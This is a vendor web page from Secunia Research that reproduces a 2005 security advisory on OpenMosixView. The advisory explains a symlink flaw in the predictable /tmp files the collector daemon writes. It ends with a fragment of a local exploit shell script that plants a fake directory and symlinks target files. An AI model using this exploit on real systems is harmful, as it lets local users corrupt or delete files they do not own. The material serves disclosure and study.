How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

   VulnDiscovery:       2004/12/21
   Release Date :       2005/03/25
   Author       :       Gangstuck and Psirac <research@rexotec.com>

   Application  :       OpenMosixView
   Affected     :       All version (lastest is openmosixview-1.5)
   Platform     :       Linux
   Risk         :       Critical
   Severity     :       Allow local user to compromise filesystem.

   Vendor       :       <http://www.openmosixview.com/>
   Reference    :       <http://www.rexotec.com/advisory/RX250305.html>

   Status       :       Vendor has been notified (2005/02/17) and will try to
                        fix the topics  listed above for the next  release of
			OMView. This may  take some time  because  of general
			architecture  changes  for  OpenMosix on 2.6. kernels.

 |=---[ - SUMMARY OVERVIEW
      `---------------------------------------------------------------------|

   OpenMosix is a Linux kernel extension for single-system image clustering
   which turns a network of ordinary computers into a supercomputer.

   OpenMosixView is an intuitive cluster-management GUI for openMosix cluster.

   It contains eight usefull applications for monitoring and administrating
   openMosix-cluster. In the package, OpenMosixCollector is the daemon
   which should/could be started on one cluster-member. It logs openmosix
   load of each node. These history log-files are analyzed by some
   openMosix Analyzer located in the pack to gives a non-stop overview
   of the load, memory and processes in a cluster.

 |=-+-[ - VULNERABILITIES OVERVIEW
    | `---------------------------------------------------------------------|
    |
 .--+-[ OpenMosixView ]
 |
 |  When OpenMosixView is started, it get nodes's names (or by default
 |  nodes's IP) with "mosctl whois id_node_number", and redirect output
 |  in /tmp/nodes.tmp without checking if file already exist, ...
 |
 +--.
    |
    '--[ OpenMosixView->OpenmosixCollector ]

   At each start of the OpenMosixCollector daemon, load of each node is
   formatted to the directory /tmp/openmosixcollector where data are
   organised in several files.

   The startup schema is :

   	[ file ] cluster
	[ file ] IDnode-n
	[ file ] IDnode-n
   	[ file ] sync.count
	[ dir  ] phist

   Permissions are correctly handled ..

	drwxr-xr-x   3 root root  1024 2004-12-23 18:54 openmosixcollector
	|
	`-----  -rw-r--r--   1 root root 42674 2004-12-21 22:20 1
		-rw-r--r--   1 root root 42612 2004-12-21 22:20 11
		-rw-r--r--   1 root root 41444 2004-12-21 22:20 2
		-rw-r--r--   1 root root 42063 2004-12-21 22:20 22
		-rw-r--r--   1 root root 41486 2004-12-21 22:20 cluster
		drwxr-xr-x   2 root root 24576 2004-12-21 22:20 phist
		-rw-r--r--   1 root root     4 2004-12-21 22:20 sync.count

   but, creation of predictable files allow any local attacker to remove
   arbitrary files on the vulnerable filesystem via the famous symlink
   vulnerability. In this case, we just have to rebuild a fake directory
   tree.

   If openmosixcollector-daemon is already running there is also a way to
   corrupt the fs due to the creation of a predictable backup temporary
   directory each 12 hours (see exploit below for more details).

echo -e "[!] Openmosix is already running.\n
   Anyway, there is a way to exploit this case but this is not
   implemented in this public exploit. OpenMosixcollector-daemon
   automatically restarts every 12 hours and saves the current
   history to a directory located in /tmp (glibc: P_tmpdir).

   This is done whith the utilisation of a predictable temporary
   dir name \"${OMCTDIR}_[date]\" where [date] format
   look like \"18.0.2005-0.0.48\". Have phun :P"
   exit 0
fi

echo -e "[-] OpenMosixCollector seems not to be started..."
echo "    - creating fake directory"
mkdir $OMCTDIR
if [ ! $? ]; then
   echo "[!] OpenMosixCollector attack failed !"
   exit 1
fi
echo "    - creating symlink attack against "
echo -e "\t> ${TARGET2}" && ln -sf $TARGET2 ${OMCTDIR}/cluster;
echo -e "\t> ${TARGET3}" && ln -sf $TARGET3 ${OMCTDIR}/sync.count;

echo "[+] OpenMosixCollector attack successfully launched."
